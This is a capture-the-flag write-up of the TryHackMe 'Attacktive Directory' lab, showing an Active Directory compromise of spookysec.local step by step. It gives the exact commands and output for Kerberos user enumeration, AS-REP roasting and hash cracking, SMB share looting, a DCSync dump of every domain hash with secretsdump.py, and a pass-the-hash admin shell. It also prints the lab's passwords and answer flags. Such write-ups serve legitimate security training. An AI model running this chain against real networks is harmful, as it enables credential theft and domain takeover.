# Attacktive Directory CTF — Writeup

A walkthrough of the "Attacktive Directory" TryHackMe room, which targets a mock corporate Active Directory environment (`spookysec.local`). The goal is to chain together several classic AD attack primitives — unauthenticated enumeration, Kerberos username validation, AS-REP Roasting, SMB share abuse, and a full domain credential dump — to ultimately gain Domain Administrator access.

**Skills covered:** AD service fingerprinting, `enum4linux-ng`, Kerberos user enumeration with `kerbrute`, AS-REP Roasting with Impacket, hash cracking with `hashcat`, SMB share enumeration, `secretsdump.py` (DCSync), and pass-the-hash via `evil-winrm`.

---

## 1. Reconnaissance

```bash
nmap -sC -sV -Pn -T4 10.49.150.194
```

Key findings:

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

This port spread — Kerberos (88), LDAP (389), SMB (445), `kpasswd` (464) — is the signature fingerprint of a **Windows Active Directory Domain Controller**. The `rdp-ntlm-info` script output further confirms this directly:

```
NetBIOS_Domain_Name: THM-AD
DNS_Domain_Name: spookysec.local
DNS_Computer_Name: AttacktiveDirectory.spookysec.local
Product_Version: 10.0.17763   (Windows Server 2019)
```

So the domain is **`spookysec.local`**, the DC's hostname is **`AttacktiveDirectory`**, and the NetBIOS domain is **`THM-AD`**. Port 5985 (WinRM) is also notable — it'll be the entry point used later once admin credentials are obtained.

## 2. Unauthenticated SMB/LDAP Enumeration

Before brute-forcing anything, I ran `enum4linux-ng` to see what's exposed to anonymous/null sessions:

```bash
enum4linux-ng.py -A 10.49.150.194
```

Key takeaways from the output:

- **Null session allowed**: `Server allows authentication via username '' and password ''` — SMB null sessions are enabled, which is often a useful foothold, though in this case most RPC enumeration still came back `STATUS_ACCESS_DENIED` for users/groups/shares.
- **Domain confirmed via LDAP** without any credentials: `Long domain name is: spookysec.local`
- **SMB signing is required** — this rules out SMB relay attacks later, since signing prevents NTLM relay from working.
- **Domain SID** leaked: `S-1-5-21-3591857110-2884097990-301047963` — potentially useful for RID-cycling or constructing SIDs for specific accounts later, though not directly used in this chain.

No valid shares or users were enumerable anonymously via RPC, so the next step is to go after Kerberos directly, which (unlike RPC/SMB here) doesn't require a session to validate usernames.

## 3. Kerberos Username Enumeration with Kerbrute

Kerberos has a quirk that makes it a great username oracle: when you request a TGT (AS-REQ) for a username, the KDC's response differs depending on whether the username exists — _without requiring any valid credentials to make that determination_. `kerbrute` automates probing this:

```bash
kerbrute userenum -d spookysec.local --dc 10.49.150.194 userlist.txt
```

This confirmed a list of valid usernames (note: Kerberos principal names were resolved case-insensitively by the KDC, so several entries are just case variants of the same real account):

```
james@spookysec.local
svc-admin@spookysec.local
robin@spookysec.local
darkstar@spookysec.local
administrator@spookysec.local
backup@spookysec.local
paradox@spookysec.local
ori@spookysec.local
```

(plus case-variant duplicates like `James`, `JAMES`, `Robin`, etc. — same underlying accounts)

`svc-admin` immediately stands out as interesting: service accounts (`svc-*` naming convention) are a classic high-value AD target, since they're often configured with relaxed security settings (like disabled Kerberos pre-authentication) for automation compatibility — which is exactly what the next step probes for.

## 4. AS-REP Roasting

With a confirmed list of valid usernames, the next move is to check which of them have **Kerberos pre-authentication disabled** (`UF_DONT_REQUIRE_PREAUTH`). When this flag is set, an attacker can request that account's AS-REP (part of the TGT issuance exchange) _without knowing its password at all_ — and that AS-REP is encrypted with a key derived from the account's actual password hash, making it crackable offline.

```bash
python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/ -dc-ip 10.49.150.194 -usersfile valid_users.txt -request
```

Output showed every account _except one_ responding with `doesn't have UF_DONT_REQUIRE_PREAUTH set`:

```
$krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL:b0b0996f8927a3c898a20beefba4f101$8e8e22fe2741e24d14fa2c7af3595375ee114465a1780714508f12a4784a5b8ba723f7d4d7b5d7e65029a550b1297bdff9f8570c70768889f221ccccd1ae715b1c7c6e7d599d4302e21ef904cb0fd34c2b99ba6f6667f536b53fea2fb2ef755b90f47d19103a67f6aa555d492aa02ba2edd31a9230d194ebb2b88c53afc23c5bd66fb48e219eeae796c3cda76b48d0ffa8eb22c0bc4986d6547e1d1ef93f3e9fc9cfc8d74f6c07b6f732e696c8955b8641f9da2c86c78ee23926cadaab1c9e2b6bbb0263644172ca6d2652a89ccd1e77ad29222178822aed377bf9d9a5d5cc64160ee4c60d7ae0120457b4732630816b1a5a
```

**`svc-admin` is AS-REP roastable.** This confirms the earlier suspicion that a service account would be the misconfigured one.

### Cracking the hash

```bash
hashcat -m 18200 hash.txt passwordlist.txt
```

- `-m 18200` — the hash mode for Kerberos 5, etype 23, AS-REP hashes

Result:

```
$krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL:...:management2005
```

**Credentials: `svc-admin` / `management2005`**

The crack took under a second against a ~70K-word list — a strong sign the password was deliberately weak for the exercise, which lines up with the "service accounts get weak, rarely-rotated passwords" pattern this technique is designed to teach.

## 5. SMB Share Enumeration

With valid domain credentials in hand, SMB opens up properly (no more access-denied):

```bash
smbclient -L //10.49.150.194 -U 'svc-admin%management2005'
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backup          Disk      
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
SYSVOL          Disk      Logon server share 
```

Alongside the default administrative shares (`ADMIN$`, `C$`, `IPC$`) and the standard AD shares (`NETLOGON`, `SYSVOL`), there's a **non-default share called `backup`** — clearly worth investigating.

```bash
smbclient //10.49.150.194/backup -U 'svc-admin%management2005'
```

```
smb: \> ls
  backup_credentials.txt              A       48

smb: \> get backup_credentials.txt
```

```bash
cat backup_credentials.txt
# YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw%
```

That trailing `%` is just shell prompt noise (zsh's "no trailing newline" marker), not part of the actual file content. Decoding the Base64:

```bash
echo 'YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw' | base64 -d
# backup@spookysec.local:backup2517860
```

**Credentials: `backup` / `backup2517860`**

> Note: my first decode attempt included the trailing `%` character from the shell prompt in the input string, which broke the Base64 padding and threw `invalid input`. Stripping it before decoding fixed it.

## 6. DCSync via `secretsdump.py`

The username `backup` is a strong hint about this account's actual AD privileges: Domain Controllers commonly have a dedicated backup account granted the **"Replicating Directory Changes All"** extended right, since backup software needs to be able to pull full directory state (including credential material) for disaster-recovery purposes. That specific right is also exactly what's needed to perform a **DCSync attack** — impersonating a legitimate Domain Controller replication partner to pull password hashes for _any_ account in the domain, including `krbtgt` and `Administrator`, without ever touching the DC's filesystem directly.

```bash
/usr/local/bin/secretsdump.py spookysec.local/backup:backup2517860@10.49.150.194
```

The initial `RemoteOperations` attempt failed with `rpc_s_access_denied` (expected — `backup` isn't a local admin), but `secretsdump.py` automatically fell back to the **DRSUAPI method**, which is exactly the replication-rights-based DCSync technique:

```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\james:1105:...9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\svc-admin:1114:...fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:...19741bde08e135f4b40f1ca9aab45538:::
...
```

This dumped **every account's NTLM hash** in the domain, including `krbtgt` (useful for Golden Ticket attacks, though out of scope for this room) and — critically — the **Administrator** account:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
```

The format is `username:RID:LM-hash:NTLM-hash:::`. The NTLM hash (`0e0363213e37b94221497260b0bcb4fc`) is what matters here — that alone is enough to authenticate as Administrator via **pass-the-hash**, without ever needing the plaintext password.

## 7. Domain Admin via Pass-the-Hash

```bash
evil-winrm -i 10.49.150.194 -u 'Administrator' -H '0e0363213e37b94221497260b0bcb4fc'
```

```
Evil-WinRM shell v4.1
Info: Establishing connection to remote endpoint
Info: Connection successful
```

**Full administrative shell obtained — Domain Admin access achieved.**

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\Administrator\Desktop\root.txt
TryHackMe{4ctiveD1rectoryM4st3r}

*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\backup\Desktop\PrivESC.txt
TryHackMe{B4ckM3UpSc0tty!}

*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\svc-admin\Desktop\user.txt.txt
TryHackMe{K3rb3r0s_Pr3_4uth}
```

**All three flags obtained.** ✅

---

## Summary

|Flag|Value|How obtained|
|---|---|---|
|svc-admin (user) flag|`TryHackMe{K3rb3r0s_Pr3_4uth}`|AS-REP Roasting on `svc-admin`, path confirmed via WinRM|
|backup (privesc) flag|`TryHackMe{B4ckM3UpSc0tty!}`|SMB `backup` share → Base64-decoded creds|
|Administrator (root) flag|`TryHackMe{4ctiveD1rectoryM4st3r}`|DCSync via `secretsdump.py` → pass-the-hash|

### Attack chain at a glance

1. **Recon** — `nmap` fingerprints a Windows AD Domain Controller (`spookysec.local`, `THM-AD`)
2. **Unauthenticated enum** — `enum4linux-ng` confirms null SMB sessions allowed and leaks the domain SID, but RPC enum of users/shares is locked down
3. **Kerberos user enum** — `kerbrute userenum` validates real usernames against the KDC without needing credentials, flags `svc-admin` as a service account of interest
4. **AS-REP Roasting** — `GetNPUsers.py` finds `svc-admin` has Kerberos pre-auth disabled, dumps a crackable `$krb5asrep$` hash
5. **Hash cracking** — `hashcat -m 18200` cracks it instantly to `management2005`
6. **SMB share hunting** — authenticated as `svc-admin`, finds a non-default `backup` share containing Base64-encoded credentials for the `backup` account
7. **DCSync** — the `backup` account has AD replication rights; `secretsdump.py` abuses this to dump every domain account's NTLM hash, including Administrator's
8. **Pass-the-hash** — `evil-winrm` authenticates as Administrator using only the NTLM hash, no plaintext password ever needed → full Domain Admin shell

### Takeaways / lessons

- **Kerberos pre-auth is an oracle you can query without credentials.** Both username validation (via `kerbrute`) and AS-REP Roasting (via `GetNPUsers.py`) work against an _unauthenticated_ attacker — no domain creds are needed to find and exploit these misconfigurations, only network access to the KDC.
- **Service accounts are consistently the weak link in AD environments.** `svc-admin`'s naming convention flagged it as a target before any technical analysis confirmed it, and in practice, service accounts are disproportionately likely to have disabled pre-auth, weak/static passwords, and over-provisioned privileges — all because they're configured once for automation and rarely revisited.
- **Non-default SMB shares are worth enumerating explicitly.** The `backup` share wasn't part of the standard administrative share set and held credentials in cleartext (just Base64-obscured, not actually encrypted).
- **Account naming can leak privilege hints.** An account literally named `backup` having DCSync-capable replication rights is a realistic (if slightly on-the-nose) example of how naming conventions in real AD environments often correlate with elevated, special-purpose permissions.
- **DCSync doesn't require code execution on the DC.** `secretsdump.py`'s DRSUAPI method abuses legitimate AD replication protocol — any account with "Replicating Directory Changes" + "Replicating Directory Changes All" rights can pull every credential in the domain remotely, which is why those rights should be tightly scoped to actual Domain Controllers and dedicated backup infrastructure, not individual service accounts.
- **NTLM hashes are as good as passwords for lateral movement.** Pass-the-hash via `evil-winrm` means cracking the Administrator's actual password was never even necessary — defenders should treat NTLM hash exposure as equivalent to full credential compromise, not a lesser issue.

---

_Writeup based on my own enumeration and exploitation notes, cross-referenced against a public walkthrough by Abdallah_samir on Medium for methodology confirmation._